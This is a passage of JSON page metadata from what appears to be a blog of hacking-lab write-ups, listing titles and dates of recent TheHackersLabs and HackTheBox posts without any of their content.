端口运行着s..."},"recentPosts":[{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"}]},"__N_SSG":true}